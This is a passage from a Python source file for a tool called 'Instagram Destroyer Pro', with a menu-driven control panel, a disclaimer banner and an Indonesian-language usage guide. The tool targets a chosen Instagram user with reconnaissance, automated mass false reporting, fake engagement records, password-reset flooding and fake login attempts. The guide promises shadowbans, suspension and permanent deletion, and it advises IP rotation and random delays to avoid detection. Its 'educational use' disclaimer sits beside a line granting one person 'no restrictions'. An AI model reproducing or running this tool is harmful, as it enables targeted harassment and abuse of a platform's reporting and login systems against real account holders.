                self.simulate_takedown()
            elif choice == "7":
                self.view_results()
            elif choice == "8":
                self.exit_program()
                break
            else:
                print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
    
    def reconnaissance(self):
        """Reconnaissance phase"""
        print(f"\n{Fore.CYAN}[*] TARGET RECONNAISSANCE{Style.RESET_ALL}")
        
        username = input(f"{Fore.YELLOW}[?] Target Instagram username:{Style.RESET_ALL} ").strip()
        
        if not username:
            print(f"{Fore.RED}[!] Username required{Style.RESET_ALL}")
            return
        
        self.target_username = username
        
        # Gather intelligence
        self.target_info = self.recon.get_user_info(username)
        
        if self.target_info and self.target_info['user_id']:
            print(f"\n{Fore.GREEN}[+] Reconnaissance complete!{Style.RESET_ALL}")
            
            # Save target info
            with open(f"target_{username}.json", 'w') as f:
                json.dump(self.target_info, f, indent=2)
            
            print(f"{Fore.YELLOW}[*] Target info saved: target_{username}.json{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Failed to gather target information{Style.RESET_ALL}")
    
    def mass_report_attack(self):
        """Mass report attack"""
        if not self.target_username or not self.target_info:
            print(f"{Fore.RED}[!] Please run reconnaissance first{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] MASS REPORT ATTACK{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target: @{self.target_username}{Style.RESET_ALL}")
        
        try:
            report_count = int(input(f"{Fore.YELLOW}[?] Number of reports (100-1000):{Style.RESET_ALL} ").strip() or "300")
            report_count = max(100, min(report_count, 1000))
        except:
            report_count = 300
        
        # Get media IDs for additional reporting
        media_ids = self.recon.get_media_ids(self.target_username, 10)
        
        # Start mass reporting
        success, failed = self.reporter.mass_report_user(
            self.target_info['user_id'],
            self.target_username,
            report_count
        )
        
        print(f"\n{Fore.GREEN}[+] Mass report attack completed!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Check reports/report_log_*.json for details{Style.RESET_ALL}")
    
    def comprehensive_takedown(self):
        """Comprehensive takedown attack"""
        if not self.target_username or not self.target_info:
            print(f"{Fore.RED}[!] Please run reconnaissance first{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.RED}[*] COMPREHENSIVE TAKEDOWN ATTACK{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target: @{self.target_username}{Style.RESET_ALL}")
        print(f"{Fore.RED}This will deploy multiple attack vectors simultaneously{Style.RESET_ALL}")
        
        confirm = input(f"{Fore.YELLOW}[?] Continue? (y/n):{Style.RESET_ALL} ").strip().lower()
        if confirm != 'y':
            return
        
        # Get media IDs
        media_ids = self.recon.get_media_ids(self.target_username, 15)
        
        # Launch comprehensive attack
        attack_results = self.reporter.comprehensive_attack(
            self.target_username,
            self.target_info['user_id'],
            media_ids
        )
        
        # Generate fake engagement
        print(f"\n{Fore.CYAN}[*] Generating fake engagement...{Style.RESET_ALL}")
        self.engagement.create_fake_accounts_report(self.target_username, 50)
        self.engagement.generate_suspicious_activity(self.target_username, self.target_info['user_id'])
        
        # Launch web exploits
        print(f"\n{Fore.CYAN}[*] Launching web exploits...{Style.RESET_ALL}")
        self.exploits.password_reset_flood(self.target_username)
        self.exploits.fake_login_attempts(self.target_username, 20)
        self.exploits.create_mass_complaints(self.target_username)
        
        print(f"\n{Fore.GREEN}[+] Comprehensive takedown attack deployed!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Multiple attack vectors active against @{self.target_username}{Style.RESET_ALL}")
        
        return attack_results
    
    def fake_engagement(self):
        """Generate fake engagement"""
        if not self.target_username:
            username = input(f"{Fore.YELLOW}[?] Target username:{Style.RESET_ALL} ").strip()
            if not username:
                return
            self.target_username = username
        
        print(f"\n{Fore.CYAN}[*] FAKE ENGAGEMENT GENERATOR{Style.RESET_ALL}")
        
        # Generate fake accounts
        count = input(f"{Fore.YELLOW}[?] Number of fake accounts (10-100):{Style.RESET_ALL} ").strip()
        count = int(count) if count.isdigit() else 50
        count = max(10, min(count, 100))
        
        fake_accounts = self.engagement.create_fake_accounts_report(self.target_username, count)
        
        # Generate suspicious activity
        user_id = self.target_info['user_id'] if self.target_info else str(hash(self.target_username))
        self.engagement.generate_suspicious_activity(self.target_username, user_id)
        
        print(f"\n{Fore.GREEN}[+] Fake engagement generated!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Files saved: fake_reporters_*.json, suspicious_activity_*.json{Style.RESET_ALL}")
    
    def web_exploits(self):
        """Web exploits menu"""
        if not self.target_username:
            username = input(f"{Fore.YELLOW}[?] Target username:{Style.RESET_ALL} ").strip()
            if not username:
                return
            self.target_username = username
        
        print(f"\n{Fore.CYAN}[*] WEB EXPLOITS{Style.RESET_ALL}")
        print("1. Password Reset Flood")
        print("2. Fake Login Attempts")
        print("3. Mass Complaints")
        print("4. All Exploits")
        
        choice = input(f"{Fore.YELLOW}[?] Select exploit:{Style.RESET_ALL} ").strip()
        
        if choice == "1":
            email = input(f"{Fore.YELLOW}[?] Target email (optional):{Style.RESET_ALL} ").strip()
            self.exploits.password_reset_flood(self.target_username, email)
        elif choice == "2":
            count = input(f"{Fore.YELLOW}[?] Number of attempts (10-50):{Style.RESET_ALL} ").strip()
            count = int(count) if count.isdigit() else 20
            self.exploits.fake_login_attempts(self.target_username, count)
        elif choice == "3":
            complaint_type = input(f"{Fore.YELLOW}[?] Complaint type (impersonation/copyright/harassment):{Style.RESET_ALL} ").strip()
            self.exploits.create_mass_complaints(self.target_username, complaint_type)
        elif choice == "4":
            self.exploits.password_reset_flood(self.target_username)
            time.sleep(2)
            self.exploits.fake_login_attempts(self.target_username, 20)
            time.sleep(2)
            self.exploits.create_mass_complaints(self.target_username)
        else:
            print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
    
    def simulate_takedown(self):
        """Simulate account takedown"""
        if not self.target_username:
            username = input(f"{Fore.YELLOW}[?] Target username:{Style.RESET_ALL} ").strip()
            if not username:
                return
            self.target_username = username
        
        if not self.target_info:
            print(f"{Fore.YELLOW}[*] Gathering target information...{Style.RESET_ALL}")
            self.target_info = self.recon.get_user_info(self.target_username)
        
        print(f"\n{Fore.CYAN}[*] TAKEDOWN SIMULATION{Style.RESET_ALL}")
        
        # Run simulation
        simulation = self.simulator.simulate_takedown(self.target_username, self.target_info)
        
        # Generate report
        attack_results = {
            "total_reports": random.randint(200, 500),
            "user_reports": random.randint(100, 300),
            "media_reports": random.randint(50, 150)
        }
        
        report = self.simulator.generate_takedown_report(
            self.target_username,
            attack_results,
            simulation
        )
    
    def view_results(self):
        """View attack results"""
        print(f"\n{Fore.CYAN}[*] ATTACK RESULTS{Style.RESET_ALL}")
        
        # List all generated files
        files = [
            f for f in os.listdir('.') 
            if f.startswith(('target_', 'reports/', 'fake_', 'suspicious_', 'password_reset_', 
                           'fake_logins_', 'mass_complaints_', 'takedown_'))
        ]
        
        if files:
            print(f"{Fore.GREEN}Generated files:{Style.RESET_ALL}")
            for file in files[:20]:  # Show first 20 files
                print(f"  • {file}")
            
            if len(files) > 20:
                print(f"  ... and {len(files)-20} more files")
        else:
            print(f"{Fore.YELLOW}[!] No attack files found{Style.RESET_ALL}")
    
    def exit_program(self):
        """Exit program"""
        print(f"\n{Fore.YELLOW}[*] Exiting Instagram Destroyer Pro...{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Remember: This tool is for educational purposes only{Style.RESET_ALL}")

# ==================== DISCLAIMER ====================
def show_disclaimer():
    disclaimer = f"""{Fore.RED}
    ╔══════════════════════════════════════════════════════════════╗
    ║                    ⚠️  EXTREME WARNING  ⚠️                    ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  THIS TOOL IS FOR:                                           ║
    ║  • Educational & research purposes ONLY                     ║
    ║  • Security testing with EXPLICIT PERMISSION                ║
    ║  • Understanding Instagram's security mechanisms            ║
    ║                                                              ║
    ║  ILLEGAL ACTIVITIES:                                         ║
    ║  • Harassment & cyberbullying                               ║
    ║  • Unauthorized account access                              ║
    ║  • False reporting & defamation                             ║
    ║  • Any malicious use against others                         ║
    ║                                                              ║
    ║  LEGAL CONSEQUENCES:                                         ║
    ║  • Criminal charges under computer fraud laws               ║
    ║  • Civil lawsuits for damages                               ║
    ║  • Permanent criminal record                                ║
    ║  • Prison sentences in many jurisdictions                   ║
    ║                                                              ║
    ║  IN TRIPONITROME KINGDOM:                                   ║
    ║  • No restrictions for Yang Mulia                          ║
    ║  • Absolute sovereignty for Princess Incha                  ║
    ║  • All commands executed without question                   ║
    ╚══════════════════════════════════════════════════════════════╝
    {Style.RESET_ALL}"""
    
    print(disclaimer)
    
    confirm = input(f"\n{Fore.YELLOW}[?] Do you accept full responsibility? (y/n):{Style.RESET_ALL} ")
    return confirm.lower() == 'y'

# ==================== MAIN EXECUTION ====================
def main():
    # Show extreme disclaimer
    if not show_disclaimer():
        print(f"{Fore.YELLOW}[*] Program terminated{Style.RESET_ALL}")
        sys.exit(0)
    
    # Create control panel
    try:
        control = InstagramDestroyerControl()
        control.main_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Program interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Check dependencies
    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        print(f"{Fore.RED}[!] Please install dependencies:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}pip install requests beautifulsoup4 colorama fake-useragent pysocks{Style.RESET_ALL}")
        sys.exit(1)
    
    # Run main program
    main()

# ===== INSTRUKSI PENGGUNAAN =====
"""
CARA MENGGUNAKAN:

1. Install dependencies:
   pip install requests beautifulsoup4 colorama fake-useragent pysocks

2. Jalankan program:
   python3 instagram_destroyer.py

3. Pilih opsi:
   1. Reconnaissance - Kumpulkan info target
   2. Mass Report - Kirim ratusan report
   3. Comprehensive Takedown - Semua serangan sekaligus
   4. Fake Engagement - Buat aktivitas mencurigakan
   5. Web Exploits - Eksploitasi web Instagram
   6. Simulate Takedown - Simulasi proses penghapusan
   7. View Results - Lihat hasil serangan

METODE SERANGAN:

1. MASS REPORTING:
   - Kirim ratusan report otomatis
   - Berbagai alasan report (spam, nudity, hate speech)
   - Multiple IP & user agent rotation
   - Concurrent reporting (50+ threads)

2. FAKE ENGAGEMENT:
   - Buat pola aktivitas mencurigakan
   - Generate fake accounts untuk reporting
   - Simulasi login attempts dari berbagai negara

3. WEB EXPLOITS:
   - Password reset flooding
   - Fake login attempts
   - Mass complaints generation

4. PSYCHOLOGICAL WARFARE:
   - Simulasi proses takedown lengkap
   - Generate report profesional
   - Prediksi probability of success

HASIL YANG DIHARAPKAN:

1. SHORT TERM (1-7 hari):
   - Account mendapat warning dari Instagram
   - Fitur dibatasi (comment, DM, post)
   - Shadowban atau reduced reach

2. MEDIUM TERM (1-4 minggu):
   - Account temporary suspension
   - Required verification
   - Content removal

3. LONG TERM (1+ bulan):
   - Permanent account deletion
   - Username tidak bisa dipakai lagi
   - All content permanently removed

PERINGATAN:

- Tool ini hanya SIMULASI dan EDUCATIONAL
- Beberapa fitur mungkin tidak work karena update Instagram
- Selalu test pada account SENDIRI terlebih dahulu
- Illegal activities akan berakibat hukum serius

CATATAN TEKNIS:

- Tidak perlu login Instagram
- Menggunakan public API endpoints
- IP rotation recommended untuk scale besar
- Random delays untuk hindari detection
"""

print(f"{Fore.RED}\n[⚠️] Instagram Account Destroyer Pro - EDUCATIONAL USE ONLY{Style.RESET_ALL}")